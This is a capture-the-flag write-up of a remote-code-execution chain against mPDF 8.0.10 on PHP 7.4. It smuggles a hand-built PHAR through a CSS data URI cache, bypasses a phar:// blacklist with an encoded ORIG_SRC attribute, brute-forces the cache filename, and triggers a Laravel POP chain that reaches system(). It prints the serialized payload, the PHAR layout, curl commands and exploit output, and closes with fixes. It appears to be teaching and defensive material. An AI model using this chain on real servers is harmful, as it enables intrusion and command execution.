# 15 — QuoteBuilder (mPDF PHAR kill chain) — Writeup

## TL;DR

`QuoteBuilder` renders user HTML to PDF with **mPDF 8.0.10** on **PHP 7.4.33**.
mPDF caches every CSS `data:` URI to `<tempDir>/mpdf/_tempCSSidata<random_int(1,10000)>_<i>.<ext>`,
which is an upload primitive. mPDF's `phar://` blacklist (added for issue #949) only
inspects the `src` attribute, not the `ORIG_SRC` attribute it actually opens first
(issue #1381), and it `rawurldecode()`s `ORIG_SRC` *after* the app's own blacklist ran.
So: smuggle a hand-built PHAR in as a base64 `data:` URI, guess the 1-in-10000 cache
filename with a few thousand `<img ... ORIG_SRC="ph%61r://…">` probes in the same
document, let PHP 7.4 unserialize the PHAR metadata, and land in the real Laravel
`PendingBroadcast → Bus\Dispatcher → call_user_func('system', …)` chain.

Flag: `PHRACK{a_data_uri_smuggled_my_phar_into_the_mpdf_cache}`

---

## The bug

### The application

`challenge/src/public/index.php`, in full, is a form and this:

```php
function reject_dangerous(string $html): void
{
    foreach (['<?', '<script', '<iframe', 'javascript:', 'php://', 'phar://', 'file://'] as $needle) {
        if (stripos($html, $needle) !== false) {
            http_response_code(400);
            exit("refused: '{$needle}' is not allowed in a quote template\n");
        }
    }
}

$mpdf = new \Mpdf\Mpdf(['tempDir' => TEMP_DIR]);
$mpdf->WriteHTML($html);
$pdf = $mpdf->Output('', \Mpdf\Output\Destination::STRING_RETURN);
```

There is no file read, no upload, no `eval`, no `unserialize`. The whole attack surface is
"mPDF is handed a string".

### Why that is a deserialization sink at all

PHP's PHAR format stores an arbitrary **serialized** blob in its manifest. Up to PHP 7.4
the `phar://` stream wrapper unserializes that blob during `phar_parse_pharfile()` — i.e.
as a side effect of *opening the archive*, not of reading a file out of it. Any function
that resolves a `phar://` path is therefore an `unserialize()` call site:

```console
$ php7.4 -r 'class P{public $x; function __destruct(){echo "destruct: $this->x\n";}} @file_exists("phar:///w/pwn.jpeg/a");'
destruct: BOOM
$ php8.1 -r 'class P{public $x; function __destruct(){echo "destruct: $this->x\n";}} @file_exists("phar:///w/pwn.jpeg/a");'
$
```

This is the observation Orange Tsai used in HITCON CTF 2017 and Sam Thomas presented at
Black Hat USA 2018; it is the reason PHP 8.0 stopped unserializing PHAR metadata
automatically. The lab is pinned to `php:7.4-apache` (7.4.33) for exactly this reason —
**the technique does not work on PHP 8**.

### Link 1 — mPDF opens `ORIG_SRC` without checking it

mPDF's HTML parser (`src/Mpdf.php`, ~line 13729) rewrites `src`/`href` into absolute paths
and stashes the original in a synthetic attribute:

```php
$orig_srcpath = $path;
$this->GetFullPath($path);
$e = preg_replace('/ (href|src)="(.*?)"/i', ' \\1="' . $path . '"', $e);
...
if ($orig_srcpath) {
    $attr['ORIG_SRC'] = $orig_srcpath;
}
if (!empty($contents)) {
    foreach ($contents[0] as $v) {           // <- every literal attribute of the tag
        ...
        $attr[strtoupper($a3[1])] = trim($a3[2]);
    }
}
```

The attribute-extraction loop runs *after* the assignment, so writing `ORIG_SRC="…"`
literally in the HTML **overwrites** the value mPDF derived. `src/Tag/Img.php` then passes
both values down:

```php
$srcpath      = $attr['SRC'];
$orig_srcpath = (isset($attr['ORIG_SRC']) ? $attr['ORIG_SRC'] : '');
```

and `src/Image/ImageProcessor.php::getImage()` in 8.0.10 only filters the first one:

```php
/**
 * Prevents insecure PHP object injection through phar:// wrapper
 * @see https://github.com/mpdf/mpdf/issues/949
 */
$wrapperChecker = new StreamWrapperChecker($this->mpdf);
if ($wrapperChecker->hasBlacklistedStreamWrapper($file)) {          // <- $file only
    return $this->imageError(...);
}
...
if ($firsttime && $orig_srcpath) {
    if (!preg_match('/^(http|ftp)/', $orig_srcpath)) {
        $orig_srcpath = $this->urldecodeParts($orig_srcpath);       // <- rawurldecode
    }
}
...
if ($orig_srcpath && $this->mpdf->basepathIsLocal && $check = @fopen($orig_srcpath, 'rb')) {
    fclose($check);
    $file = $orig_srcpath;
    $data = file_get_contents($file);                               // <- opened, unchecked
}
```

That `@fopen($orig_srcpath, 'rb')` is the deserialization sink, and it is tried **before**
the sanitised `$file`.

I confirmed the version range empirically by pulling `ImageProcessor.php` for every 8.0.x
tag and counting `hasBlacklistedStreamWrapper` call sites:

```
v8.0.10 … v8.0.15 : 1 call site  (vulnerable)
v8.0.16 … v8.0.17 : 2 call sites (fixed — the second one checks $orig_srcpath)
v8.1.0+           : refactored into Mpdf\File\AssetFetcher, which checks both
```

The lab pins `8.0.10`, the version in @Cyku's report.

### Link 2 — the app's blacklist is bypassed by mPDF itself

`reject_dangerous()` does `stripos($html, 'phar://')` on the raw POST body. But mPDF
`rawurldecode()`s `ORIG_SRC` (via `urldecodeParts()`) before opening it. So the payload
travels as `ph%61r://` — invisible to a substring blacklist, `phar://` by the time it
reaches `fopen()`. A textbook "validate before normalise" bug, and it is real mPDF code,
not something added for this lab.

### Link 3 — mPDF is the upload form

`src/CssManager.php::ReadCSS()`, line 229 of 8.0.10:

```php
// Replace any background: url(data:image... with temporary image file reference
preg_match_all("/(url\(data:image\/(jpeg|gif|png);base64,(.*?)\))/si", $CSSstr, $idata);
$count_idata = count($idata[0]);
if ($count_idata) {
    for ($i = 0; $i < $count_idata; $i++) {
        $file = $this->cache->write('_tempCSSidata' . random_int(1, 10000) . '_' . $i . '.' . $idata[2][$i],
                                     base64_decode($idata[3][$i]));
        $CSSstr = str_replace($idata[0][$i], 'url("' . $file . '")', $CSSstr);
    }
}
```

`base64_decode()` of an attacker string, written verbatim to a file whose name is
`_tempCSSidata<N>_<i>.<jpeg|gif|png>` in `$config['tempDir'] . '/mpdf'`
(`src/ServiceFactory.php:59`). The content is not validated in any way — it does not have
to be an image. That is an arbitrary-file-write-with-a-nearly-known-name primitive.

`Mpdf\Cache::write()` writes through `tempnam()` + `rename()`, and `clearOld()` only
deletes files older than `cacheCleanupInterval` (3600 s by default), so **the cached files
survive the request**. That is what makes the guessing game winnable.

---

## Building the exploit

### Primitive 1 — a PHAR, written in Python

PHAR writing normally needs `phar.readonly=0`, which nobody has. The format is simple
enough to emit by hand (`solve/solve.py::build_phar`):

```
<stub: "<?php __HALT_COMPILER(); ?>\r\n">
u32  manifest length
     u32  number of files
     u16  API version           <-- BIG endian
     u32  global flags          (0x00010000 = signature present)
     u32  alias length  + alias
     u32  metadata length + metadata      <-- the serialized payload
     per-file entries:
         u32 name length + name
         u32 uncompressed size
         u32 unix mtime
         u32 compressed size
         u32 crc32 of the content
         u32 flags (unix permissions in the low bits)
         u32 per-file metadata length
<file bodies, concatenated in entry order>
<sha1 digest of everything above> u32 signature type (0x02 = SHA1) "GBMB"
```

The one field that is *not* little-endian is the API version. `phar_parse_pharfile()` reads
it as `buffer[0] << 8 | buffer[1]` and rejects anything whose masked value is below
`PHAR_API_MIN_READ`:

```c
manifest_ver = (((unsigned char)buffer[0]) << 8) | ((unsigned char)buffer[1]);
if ((manifest_ver & PHAR_API_VER_MASK) < PHAR_API_MIN_READ) {
    MAPPHAR_FAIL("manifest of phar \"%s\" is too old");
}
```

Packing `0x1100` little-endian yields `00 11`, which reads back as `0x0011` and the archive
is silently rejected (`file_exists()` just returns `false`, no error). Packing it big-endian
(`11 00`) is what PHP's own writer emits. This cost me one debugging round and is the only
non-obvious part of the format:

```python
manifest += struct.pack(">H", 0x1100)   # NOT "<H"
```

Byte-for-byte, the hand-built archive differs from one produced by `new Phar(...)` only in
the mtime and permission fields.

### Primitive 2 — proving the cache filename is guessable

Five renders, each containing one CSS data URI:

```console
$ for i in 1 2 3 4 5; do curl -s -o /dev/null -X POST \
    -d 'html=<style>b{background:url(data:image/jpeg;base64,QUJD)}</style>x' \
    http://127.0.0.1:8015/; done
$ docker compose exec challenge ls -l /var/www/app/vendor/mpdf/mpdf/tmp/mpdf/
-rw------- 1 www-data www-data    3 _tempCSSidata1811_0.jpeg
-rw------- 1 www-data www-data    3 _tempCSSidata3926_0.jpeg
-rw------- 1 www-data www-data    3 _tempCSSidata4526_0.jpeg
-rw------- 1 www-data www-data    3 _tempCSSidata7797_0.jpeg
-rw------- 1 www-data www-data    3 _tempCSSidata9667_0.jpeg
```

Three data URIs in a *single* document, one per MIME sub-type:

```console
$ curl -s -o /dev/null -X POST --data-urlencode \
  'html=<style>a{background:url(data:image/jpeg;base64,QQ)}b{background:url(data:image/png;base64,Qg)}c{background:url(data:image/gif;base64,Qw)}</style>x' \
  http://127.0.0.1:8015/
$ docker compose exec challenge ls /var/www/app/vendor/mpdf/mpdf/tmp/mpdf/
_tempCSSidata1323_1.png
_tempCSSidata4174_0.jpeg
_tempCSSidata9062_2.gif
```

So the filename is fully determined by three things: a fresh `random_int(1, 10000)` per
URI, the zero-based index of the URI inside the stylesheet, and the MIME sub-type. Two of
the three are attacker-chosen. `random_int()` is a CSPRNG — the weakness is **not** a
predictable PRNG, it is a 10 000-wide range for a name that persists on disk.

### Primitive 3 — collapsing the search space

Files accumulate, and one document can carry both the `<style>` block and thousands of
probes, so the attacker controls both sides of the birthday problem. The reference exploit
uses the deterministic version:

* every request re-plants a fresh copy (one new draw) **and** probes the next 2500
  candidates;
* the very first plant is still on disk during all four requests, so after
  `ceil(10000 / 2500) = 4` requests its value has certainly been probed.

Worst case four requests, ~270 KiB each, ~0.3 s of server time each. In practice it
usually hits on round 1 or 2, because later plants also sit in the ranges being probed.

One trap costs you the whole exploit if you miss it — `getImage()` short-circuits on a
per-`src` failure cache:

```php
if ($firsttime && isset($this->failedImages[$file])) {
    return $this->imageError($file, $firsttime, '');
}
```

`$file` is the `src` attribute. If all 2500 probe tags share `src="#"`, the first failure
poisons the map and probes 2…2500 are never attempted. Giving each tag a distinct
`src="#<n>.jpg"` fixes it. (@Cyku's PoC uses `src="#1.jpeg"` for the same reason.)

### Primitive 4 — the POP chain

`Illuminate\Broadcasting\PendingBroadcast` (v8.83.27):

```php
public function __destruct()
{
    $this->events->dispatch($this->event);
}
```

`Illuminate\Bus\Dispatcher`:

```php
public function dispatch($command)
{
    return $this->queueResolver && $this->commandShouldBeQueued($command)
                    ? $this->dispatchToQueue($command)
                    : $this->dispatchNow($command);
}

protected function commandShouldBeQueued($command)
{
    return $command instanceof ShouldQueue;
}

public function dispatchToQueue($command)
{
    $connection = $command->connection ?? null;
    $queue = call_user_func($this->queueResolver, $connection);   // <-- here
    ...
}
```

`Illuminate\Broadcasting\BroadcastEvent implements ShouldQueue` and picks up a public
`$connection` from the `Illuminate\Bus\Queueable` trait, so it satisfies both conditions.
Set `queueResolver = "system"` and `connection = "<command>"` and the destructor becomes
`system($command)`. This is exactly PHPGGC's `Laravel/RCE6`; `solve/solve.py::laravel_rce6()`
emits the serialized form directly (the `protected` properties are mangled to
`"\0*\0events"`, `"\0*\0event"`, `"\0*\0queueResolver"`):

```
O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{
  s:9:"\0*\0events";O:25:"Illuminate\Bus\Dispatcher":1:{
      s:16:"\0*\0queueResolver";s:6:"system";}
  s:8:"\0*\0event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{
      s:10:"connection";s:33:"/usr/local/bin/readflag /flag.txt";}}
```

The destructor fires during `zend_call_destructors()` at request shutdown, i.e. after the
PDF has been written, so the command's stdout is simply appended to the response body.

---

## The kill chain

```
    attacker                         QuoteBuilder (PHP 7.4.33)                mPDF 8.0.10
    ────────                         ─────────────────────────                ───────────
 ①  build PHAR in Python
    stub|manifest|meta|entries|sig
    metadata = serialized
    Laravel PendingBroadcast
            │
            │ base64
            ▼
 ②  POST html=
      <style>div.logo{background:
        url(data:image/jpeg;base64,<PHAR>)}      ──►  reject_dangerous()
      </style>                                        no "<?", no "phar://"  ✔
      <img src="#1.jpg"                                      │
           ORIG_SRC="ph%61r://…/_tempCSSidata1_0.jpeg/a.jpg">│
      <img src="#2.jpg" … _tempCSSidata2_0.jpeg …>           ▼
      … 2500 of them                               WriteHTML($html)
                                                          │
                                                          ├─► CssManager::ReadCSS()
 ③                                                        │     base64_decode() the data URI
                                                          │     Cache::write('_tempCSSidata'
                                                          │       . random_int(1,10000) . '_0.jpeg')
                                                          │   ► PHAR now on disk, name unknown
                                                          │
                                                          └─► Tag\Img::open() per <img>
                                                                ImageProcessor::getImage()
 ④                                                                StreamWrapperChecker($file)   ← only src
                                                                  urldecodeParts($orig_srcpath)
                                                                    "ph%61r://" ► "phar://"
                                                                  @fopen($orig_srcpath,'rb')
                                                                        │
                                                                        ▼
 ⑤                                                            php_stream_url_wrap_phar
                                                              phar_parse_pharfile()
                                                                unserialize(metadata)    ← PHP ≤ 7.4
                                                                        │
                                                                        ▼
 ⑥                                                   request shutdown: zend_call_destructors()
                                                     PendingBroadcast::__destruct()
                                                       Bus\Dispatcher::dispatch()
                                                         dispatchToQueue()
                                                           call_user_func('system',
                                                             '/usr/local/bin/readflag /flag.txt')
            ◄───────────────────────────────────────────────  %%EOF + flag in the response body
```

Each link, and what it costs the attacker:

| # | Link | Why it works |
| --- | --- | --- |
| ① | hand-built PHAR | the format is documented and needs no PHP; `phar.readonly` only guards *writing from PHP* |
| ② | app blacklist | substring match on the raw body; mPDF normalises afterwards |
| ③ | file smuggling | `CssManager::ReadCSS()` is an unauthenticated write-arbitrary-bytes primitive |
| ④ | mPDF #949 patch bypass | the wrapper blacklist guards `$file`, the code opens `$orig_srcpath` first |
| ⑤ | PHAR metadata | PHP ≤ 7.4 unserializes it on *open*, not on read |
| ⑥ | Laravel gadget | `__destruct` → `call_user_func` with both arguments attacker-controlled |

### Observed result

```
%%EOFuid=33(www-data) gid=33(www-data) groups=33(www-data)
PHRACK{a_data_uri_smuggled_my_phar_into_the_mpdf_cache}
<br />
<b>Fatal error</b>:  Uncaught RuntimeException: Queue resolver did not return a Queue implementation. in /var/www/app/vendor/illuminate/bus/Dispatcher.php:222
Stack trace:
#0 /var/www/app/vendor/illuminate/bus/Dispatcher.php(77): Illuminate\Bus\Dispatcher->dispatchToQueue(Object(Illuminate\Broadcasting\BroadcastEvent))
#1 /var/www/app/vendor/illuminate/broadcasting/PendingBroadcast.php(72): Illuminate\Bus\Dispatcher->dispatch(Object(Illuminate\Broadcasting\BroadcastEvent))
#2 [internal function]: Illuminate\Broadcasting\PendingBroadcast->__destruct()
#3 {main}
```

The command output is appended right after the PDF's `%%EOF`. The `RuntimeException` is
inherent to the gadget — `call_user_func('system', …)` returns a string, not a `Queue`, so
`dispatchToQueue()` throws on the next line. It is thrown *after* the command has already
run, so it is cosmetic; PHPGGC's `Laravel/RCE6` behaves identically.

---

## The exploit

`solve/solve.py`, Python 3 standard library only. Stages:

| function | stage |
| --- | --- |
| `php_str` / `php_protected` / `php_object` | minimal PHP serializer (`protected` ⇒ `"\0*\0name"`) |
| `laravel_rce6(cmd)` | emits the `PendingBroadcast → Dispatcher → BroadcastEvent` object graph |
| `build_phar(metadata)` | stub, manifest (note the big-endian API version), entries, SHA-1 + `GBMB` |
| `discover_cache_dir()` | scrapes the Diagnostics block for mPDF's cache directory |
| `cache_entries()` | before/after file count — the empirical proof the smuggling worked |
| `plant_css(b64)` | `<style>div.logo{background:url(data:image/jpeg;base64,…)}</style>` |
| `probe_tags(dir, lo, hi)` | one `<img src="#N.jpg" ORIG_SRC="ph%61r://…_tempCSSidataN_0.jpeg/a.jpg">` per candidate |
| `main()` | plant + probe 2500 candidates per request, ≤ 4 requests, grep `PHRACK{…}` |

Sample run:

```
[*] target: http://challenge
[*] mPDF cache directory: /var/www/app/vendor/mpdf/mpdf/tmp/mpdf
[*] POP chain (266 bytes): O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{…}
[*] PHAR built: 386 bytes, 516 bytes of base64
[+] the data URI landed on disk: mPDF's cache directory grew from 0 to 2 entries
    its name is _tempCSSidata<N>_0.jpeg with N drawn from random_int(1, 10000)
[*] search space: 10000 names, 2500 probes/request -> <= 4 requests
[*] round 1/4  candidates 1-2500  (269 KiB posted, 0.3s)  <-- HIT
[+] PHAR metadata deserialized, POP chain executed `/usr/local/bin/readflag /flag.txt` as the web user
FLAG: PHRACK{a_data_uri_smuggled_my_phar_into_the_mpdf_cache}
```

---

## Fixing it

**As the library.** mPDF 8.0.16 added the missing check:

```php
if ($wrapperChecker->hasBlacklistedStreamWrapper($file))        { return $this->imageError(...); }
if ($wrapperChecker->hasBlacklistedStreamWrapper($orig_srcpath)) { return $this->imageError(...); }
```

and 8.1.0 moved both into `Mpdf\File\AssetFetcher`, so there is one place that opens assets
instead of two. The temp-file naming was only rewritten much later — as of **8.2.5** the
`random_int(1, 10000)` line was still there, so *pin your mPDF and set a private tempDir*
rather than trusting the version alone. A correct name is
`bin2hex(random_bytes(16))`: 128 bits, not 13.3.

**As the application.**

1. *Do not blacklist.* `reject_dangerous()` inspects the string the user sent; mPDF opens
   the string after `rawurldecode()`. Any "normalise later" step defeats a substring
   filter. Validate the resolved value, at the point of use, against an allowlist of
   schemes (`http`, `https`, `data`) — which is precisely what `StreamWrapperChecker` does
   and precisely why it has to be applied to *every* path that reaches `fopen()`.
2. *Turn the primitive off globally.* Since PHP 7.2:
   ```php
   // reject phar:// for the whole process
   stream_wrapper_unregister('phar');
   ```
   Unregistering the wrapper is the sledgehammer, and for an application that never loads
   `.phar` files it costs nothing. On PHP 8 the metadata is no longer unserialized at all,
   which is the real fix; running a PDF renderer that eats untrusted HTML on PHP 7.4 is the
   root cause here.
3. *Give the renderer a private, non-guessable scratch directory.*
   ```php
   $tempDir = sys_get_temp_dir() . '/mpdf-' . bin2hex(random_bytes(16));
   mkdir($tempDir, 0700);
   $mpdf = new \Mpdf\Mpdf(['tempDir' => $tempDir]);
   // ... and delete it in a finally block
   ```
   A per-request directory removes both the persistence and the guessability that link ③
   depends on, even on an unpatched mPDF.
4. *Do not render untrusted HTML in the app's process.* Run the converter in a short-lived,
   network-isolated sandbox with a read-only filesystem apart from its scratch directory.
   Everything above is defence in depth for the day the next `getImage()` is written.
5. *Do not ship exploitable gadget chains you do not use.* `composer why illuminate/broadcasting`
   is worth running; PHPGGC has chains for Laravel, Symfony, Monolog, Guzzle, Doctrine and
   ~30 more, and every one of them is live the moment an `unserialize()` sink appears.

---

## Going further

* **Harder variant.** Remove the Diagnostics block and make the player find the install
  path first (a stack trace, `X-Generator: mPDF 8.0.10`, or a 404 page that leaks
  `DocumentRoot`). Or set `tempDir` to `sys_get_temp_dir()` so the player must realise the
  files land in `/tmp/mpdf/` instead.
* **Blind variant.** Drop `display_errors` and return a fixed-size PDF, so the command
  output never reaches the attacker. The chain then has to become a write primitive
  (`file_put_contents` gadget) or exfiltrate over DNS/HTTP.
* **Same bug, other libraries.** TCPDF was hit by the same class of issue (Sam Thomas,
  Black Hat USA 2018) and patched by banning `phar://` in
  [commit `1861e33`](https://github.com/tecnickcom/TCPDF/commit/1861e33). Any library that
  resolves URLs found in attacker content is a candidate: image proxies, HTML sanitisers,
  XML/XXE-adjacent parsers, `getimagesize()` on user paths.
* **Getting a PHAR onto disk elsewhere.** The data-URI cache is one upload primitive;
  session files (`/tmp/sess_<PHPSESSID>`, fully attacker-named), `phpinfo()`-race temp
  uploads, `PHP_SESSION_UPLOAD_PROGRESS`, and log files all work. This lab is the "the
  library uploads it for you" variant; the LFI-arms-race labs cover the others.
* **PHAR without a stub.** PHP also accepts a phar whose stub is prefixed with arbitrary
  bytes, so a payload can be made to pass `getimagesize()`/`exif` checks by prepending a
  real JPEG header before `<?php __HALT_COMPILER(); ?>`. Useful when the smuggling channel
  validates the file type — this lab's channel does not.

---

## References

* Orange Tsai, *"The Art of PHP - My CTF Journey and Untold Stories!"*, Phrack #72,
  section 4.2 — <https://phrack.org/issues/72/2>
* Anton (**@ByQwert**), *"Insecure PHP deserialization through phar:// wrapper"* —
  <https://github.com/mpdf/mpdf/issues/949>
* **@Cyku**, *"phar:// deserialization and weak randomness of temporary file name may lead
  to RCE"* — <https://github.com/mpdf/mpdf/issues/1381>
* Sam Thomas, *"It's a PHP unserialization vulnerability Jim, but not as we know it"*,
  Black Hat USA 2018 — <https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-It%27s-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf>
* Ambionics Security, **PHPGGC** (`Laravel/RCE6`) — <https://github.com/ambionics/phpggc>
* Tyson Andre, *PHP RFC: Don't automatically unserialize Phar metadata* (the change that
  killed the technique in PHP 8.0) —
  <https://wiki.php.net/rfc/phar_stop_autoloading_metadata>,
  implemented in <https://github.com/php/php-src/pull/5855>
* PHAR file format specification —
  <https://www.php.net/manual/en/phar.fileformat.php>
* mPDF source, `src/Image/ImageProcessor.php`, `src/CssManager.php`,
  `src/File/StreamWrapperChecker.php` — <https://github.com/mpdf/mpdf>
